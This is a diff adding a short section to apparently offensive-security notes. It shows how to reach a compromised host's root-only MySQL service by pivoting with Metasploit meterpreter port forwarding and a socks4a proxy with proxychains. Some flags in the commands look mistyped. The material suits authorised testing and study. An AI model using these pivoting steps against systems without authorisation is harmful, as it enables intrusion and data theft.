@@ -1120,6 +1120,37 @@ ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL
 
 This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.
 
+#### To interact with this remotely try the following:
+
+Below is using metasploit meterpreter
+
+```
+# adding local port 8003 to mysql port (3306) on attacking machine
+# on target in meterpreter shell
+meterpreter > portfwd add -l 8003 -p 3306 -p 172.17.0.2
+
+
+# On kali in a new window
+mysql -h 127.0.0.1 -port=8003 -u root -p
+```
+
+Below is using metasploit socks & proxychains
+
+```
+# on Kali
+msf auxiliary(server/socks4a)
+SRVPORT 1080
+run
+
+# On Kali
+nano etc/proxychains.conf
+# add if not there
+socks4 127.0.0.1 1080
+
+#On Kali
+proxychains mysql -u root -p -h 172.17.0.2 -P 8003
+```
+
 ### Get passwords
 
 ```
